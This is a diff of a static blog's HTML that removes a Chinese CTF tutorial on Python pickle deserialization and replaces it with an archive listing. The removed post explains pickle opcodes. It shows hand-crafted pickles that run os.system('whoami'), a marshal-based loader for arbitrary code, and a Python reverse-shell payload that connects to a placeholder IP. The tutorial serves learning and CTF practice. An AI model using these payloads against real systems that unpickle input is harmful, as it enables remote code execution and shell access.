@@ -6,18 +6,14 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>python安全之pickle反序列化 | Halfblue</title>
+  <title>Archives: 2020/4 | Halfblue</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="前两天抗疫ctf有道pickle反序列化的题，印象里好多次碰见这个知识点了，但也就是大概了解，因为感觉上就是比赛会见到。但总之总结一下吧，还是挺有意思的。">
-<meta property="og:type" content="article">
-<meta property="og:title" content="python安全之pickle反序列化">
-<meta property="og:url" content="http://yoursite.com/2020/03/09/python安全之pickle反序列化/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Halfblue">
+<meta property="og:url" content="http://yoursite.com/archives/2020/04/index.html">
 <meta property="og:site_name" content="Halfblue">
-<meta property="og:description" content="前两天抗疫ctf有道pickle反序列化的题，印象里好多次碰见这个知识点了，但也就是大概了解，因为感觉上就是比赛会见到。但总之总结一下吧，还是挺有意思的。">
-<meta property="og:updated_time" content="2020-03-27T15:29:48.234Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="python安全之pickle反序列化">
-<meta name="twitter:description" content="前两天抗疫ctf有道pickle反序列化的题，印象里好多次碰见这个知识点了，但也就是大概了解，因为感觉上就是比赛会见到。但总之总结一下吧，还是挺有意思的。">
+<meta name="twitter:title" content="Halfblue">
   
     <link rel="alternative" href="/atom.xml" title="Halfblue" type="application/atom+xml">
   
@@ -147,43 +143,36 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-python安全之pickle反序列化" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+            
   
-    <h1 class="article-title" itemprop="name">
-      python安全之pickle反序列化
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2020" class="archive-year">2020</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2020/04/02/php反序列化的千层套路/" class="archive-article-date">
+  	<time datetime="2020-04-02T13:32:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-02</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2020/04/02/php反序列化的千层套路/">php反序列化的千层套路</a>
     </h1>
   
 
-        
-        <a href="/2020/03/09/python安全之pickle反序列化/" class="archive-article-date">
-  	<time datetime="2020-03-09T09:48:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-09</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>前两天抗疫ctf有道pickle反序列化的题，印象里好多次碰见这个知识点了，但也就是大概了解，因为感觉上就是比赛会见到。但总之总结一下吧，还是挺有意思的。<a id="more"></a><br>和php或者java类似，python的序列化也是把类对象转化为字符串储存下来，方便传输保存等等，最开始接触这个功能是做模型训练的时候，也没想会有什么安全问题。主要是反序列化的过程，可能导致修改类或者命令执行的问题。<br>先写一个正常的类序列化过程：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> pickle</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>:</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,name)</span>:</span></div><div class="line">		self.name = name</div><div class="line"></div><div class="line">blue = People(<span class="string">'halfblue'</span>)</div><div class="line">ser = pickle.dumps(blue)</div><div class="line">print(ser)</div><div class="line"></div><div class="line"><span class="comment">#py3</span></div><div class="line"><span class="string">b'\x80\x03c__main__\nPeople\nq\x00)\x81q\x01&#125;q\x02X\x04\x00\x00\x00nameq\x03X\x08\x00\x00\x00halfblueq\x04sb.'</span></div><div class="line"><span class="comment">#py2</span></div><div class="line">(i__main__</div><div class="line">People</div><div class="line">p0</div><div class="line">(dp1</div><div class="line">S<span class="string">'name'</span></div><div class="line">p2</div><div class="line">S<span class="string">'halfblue'</span></div><div class="line">p3</div><div class="line">sb.</div></pre></td></tr></table></figure></p>
-<p>这里看到python2和python3的dumps方法生成的字符串是不一样的。这是因为dumps时用的协议不同，py2的是0号协议，py3默认是3号协议，可以通过给dumps函数加一个protocol参数来自己改变，但py2只能用2以下的。这个协议可以向前兼容，也就是说我们可以手写0号类型的字符串，因为这种可读性最强。简单介绍一下序列化的原理和用到的指令码：<br>序列化的过程其实就是维护一个栈和另一个memo(其实也是个栈，不是一定会用到)。<br>有几个指令码是入栈的，直接举例：<br>cos\nsystem:向栈中压入os模块的system方法，和i操作符类似。原理是调用self.find<em>class(modname, name)<br>(:向栈中压入一个标志，弹栈时使用<br>S’whoami’:向栈中压入一个字符串whoami,和V操作符类似<br>I10:向栈中压入一个数字10<br>}:向栈中压入一个空dict<br>g0:将memo中0号元素移至栈顶<br>还有几个指令码是出栈的：<br>0:弹出栈顶元素<br>t:将mark和t之间的内容转化为一个tuple<br>l:将mark和l之间的内容转化为一个list<br>s:将}和s之间的内容转化为一个dict，一次s操作只能得到一个键值对<br>u:将}(和u之间的内容转化为一个dict,相当于多个s操作，和d相同<br>p0:将栈顶元素移至memo中0号<br>b:记录栈顶state然后弹栈，记录当前栈顶inst然后弹栈，用state来更新inst然后把得到的结果压栈。更新实例的方式是call \</em>_setstate__ or __dict__.update()，build之后内存中的内容就已经改写。<br>R:记录栈顶args然后弹栈，记录当前栈顶f然后弹栈，执行f(args)然后把得到的结果压栈<br>用最简单的数据类型举例，看的比较清楚：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.loads(<span class="string">b"(S'hello'\nS'bye'\nl."</span>)</div><div class="line">[<span class="string">'hello'</span>, <span class="string">'bye'</span>]</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.loads(<span class="string">b"(S'hello'\nS'bye'\nt."</span>)</div><div class="line">(<span class="string">'hello'</span>, <span class="string">'bye'</span>)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.loads(<span class="string">b"(&#125;(S'win_count'\nI10\ndt."</span>)</div><div class="line">(&#123;&#125;, &#123;<span class="string">'win_count'</span>: <span class="number">10</span>&#125;)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.loads(<span class="string">b"&#125;S'a'\nI1\nsS'b'\nS'x'\ns."</span>)<span class="comment">#等价的几种字典存储方式</span></div><div class="line">&#123;<span class="string">'a'</span>: <span class="number">1</span>, <span class="string">'b'</span>: <span class="string">'x'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.loads(<span class="string">b"(dS'a'\nI1\nsS'b'\nS'x'\ns."</span>)</div><div class="line">&#123;<span class="string">'a'</span>: <span class="number">1</span>, <span class="string">'b'</span>: <span class="string">'x'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.loads(<span class="string">b"&#125;(S'win_count'\nI10\nd."</span>)</div><div class="line">&#123;<span class="string">'win_count'</span>: <span class="number">10</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.loads(<span class="string">b"&#125;(S'name'\nS'rua'\nS'grade'\nS'www'\nu."</span>)</div><div class="line">&#123;<span class="string">'name'</span>: <span class="string">'rua'</span>, <span class="string">'grade'</span>: <span class="string">'www'</span>&#125;</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.loads(<span class="string">b"&#125;(Vname\nVrua\nVgrade\nVwww\nu."</span>)</div><div class="line">&#123;<span class="string">'name'</span>: <span class="string">'rua'</span>, <span class="string">'grade'</span>: <span class="string">'www'</span>&#125;</div></pre></td></tr></table></figure></p>
-<p>手写比较麻烦的化还可以用<a href="https://xz.aliyun.com/t/7012这个工具" target="_blank" rel="external">https://xz.aliyun.com/t/7012这个工具</a><br>所以我们就可以修改类的属性和值，直接替换对应的部分就可以了，比如给上面那个People类改个属性名再改个值：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">ser2 = <span class="string">'''(i__main__</span></div><div class="line">People</div><div class="line">p0</div><div class="line">(dp1</div><div class="line">S'nick'</div><div class="line">p2</div><div class="line">S'bluehalf'</div><div class="line">p3</div><div class="line">sb.'''</div><div class="line">s = pickle.loads(ser2)</div><div class="line">print(s.nick) <span class="comment">#bluehalf</span></div></pre></td></tr></table></figure></p>
-<p>这是直接修改为字符串的，其实也可以调用其他模块的内容，比如同目录有个secret.py，内容是name=’testsecret’,那么修改PVM码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">ser2 = <span class="string">'''(i__main__</span></div><div class="line">People</div><div class="line">p0</div><div class="line">(dp1</div><div class="line">S'nick'</div><div class="line">p2</div><div class="line">csecret</div><div class="line">name</div><div class="line">p3</div><div class="line">sb.'''</div><div class="line">s = pickle.loads(ser2)</div><div class="line">print(s.nick) <span class="comment">#testsecret</span></div></pre></td></tr></table></figure></p>
-<p>很直观<br>命令执行的原理，是python中的类有一个__reduce__魔术方法，在序列化的时候使用就可以让这个类根据我们在<strong>reduce</strong>中指定的方式进行序列化。先走一遍正常的流程：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>:</span></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,name)</span>:</span></div><div class="line">		self.name = name</div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></div><div class="line">		<span class="keyword">return</span> __import__(<span class="string">'os'</span>).system,(<span class="string">'whoami'</span>,)</div><div class="line">blue = People(<span class="string">'halfblue'</span>)</div><div class="line">ser = pickle.dumps(blue,protocol=<span class="number">0</span>)</div><div class="line"></div><div class="line"><span class="comment">#结果</span></div><div class="line">cnt</div><div class="line">system</div><div class="line">p0</div><div class="line">(Vwhoami</div><div class="line">p1</div><div class="line">tp2</div><div class="line">Rp3</div><div class="line">.</div><div class="line">当然也可以反弹shell</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></div><div class="line">        a = <span class="string">"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx.xxx.xxx.xxx",9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""</span></div><div class="line">        <span class="keyword">return</span> (os.system,(a,))</div></pre></td></tr></table></figure></p>
-<p>可以看到当一个类加入reduce方法后，dumps生成的内容就给类没有关系了，只和reduce方法中的返回值有关，可以把R操作符看作reduce方法的特征。所以只要把loads的内容改成上边这种形式就可以命令执行。<br>当然这是python3，因为reduce方法是新式类才拥有的，py2中需要用class People(object),定义时继承object类才是新式类。<br>这种只能执行一行代码，如果想执行比较复杂的代码可以用marshal类，py2正常，py3可能有bug<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> marshal</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">pass</span> <span class="comment"># Your code here</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"""ctypes</span></div><div class="line">FunctionType</div><div class="line">(cmarshal</div><div class="line">loads</div><div class="line">(cbase64</div><div class="line">b64decode</div><div class="line">(S'%s'</div><div class="line">tRtRc__builtin__</div><div class="line">globals</div><div class="line">(tRS''</div><div class="line">tR(tR.""" % base64.b64encode(marshal.dumps(foo.func_code))</div></pre></td></tr></table></figure></p>
-<p>命令执行还有其他方法，比如重写__setstate__方法等等<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ser3 = <span class="string">b"c__main__\nPeople\n)\x81&#125;(S'__setstate__'\ncos\nsystem\nubS'whoami'\nb."</span></div><div class="line">s = pickle.loads(ser3)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.loads(<span class="string">b"(S'whoami'\nios\nsystem\n."</span>) <span class="comment">#另一种执行命令的格式，利用i操作符INST</span></div><div class="line">laptop<span class="number">-43</span>ok3dvc\bz</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>pickle.loads(<span class="string">b"(cos\nsystem\nS'whoami'\no."</span>)<span class="comment">#另一种执行命令的格式，利用o操作符</span></div><div class="line">laptop<span class="number">-43</span>ok3dvc\bz</div></pre></td></tr></table></figure></p>
-<p>pickle反序列化相关的内容大概就这些，题目一般是修改实例内容满足判断条件，或者配合绕沙盒来命令执行，绕沙盒的部分太灵活就不太好总结了。</p>
-<p>参考链接<br><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="external">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a><br><a href="https://zhuanlan.zhihu.com/p/89132768" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/89132768</a><br><a href="https://www.anquanke.com/post/id/188981" target="_blank" rel="external">https://www.anquanke.com/post/id/188981</a><br><a href="https://xz.aliyun.com/t/7012" target="_blank" rel="external">https://xz.aliyun.com/t/7012</a><br><a href="https://www.smi1e.top/%E4%BB%8Ebalsn-ctf-pyshv%E5%AD%A6%E4%B9%A0python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank" rel="external">https://www.smi1e.top/%E4%BB%8Ebalsn-ctf-pyshv%E5%AD%A6%E4%B9%A0python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a><br><a href="https://xz.aliyun.com/t/7436" target="_blank" rel="external">https://xz.aliyun.com/t/7436</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
+        <div class="article-info info-on-right">
+          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
 		<ul class="article-tag-list">
@@ -195,97 +184,19 @@
 		</ul>
 	</div>
 
-      
+          
 
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2020/03/09/python安全之pickle反序列化/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2020/03/21/java反序列化连续剧一/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          java反序列化连续剧一
-        
-      </div>
-    </a>
   
   
-    <a href="/2020/01/09/hackthebox环境配置及入门关卡writeup/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">hackthebox环境配置及入门关卡writeup</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-
-
-
-
-  
-    <div class="duoshuo"></div>
+    </div></section>
   
 
-
+    
 
 
           </div>
@@ -308,8 +219,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
-		isArchive: false,
+		isPost: false,
+		isArchive: true,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
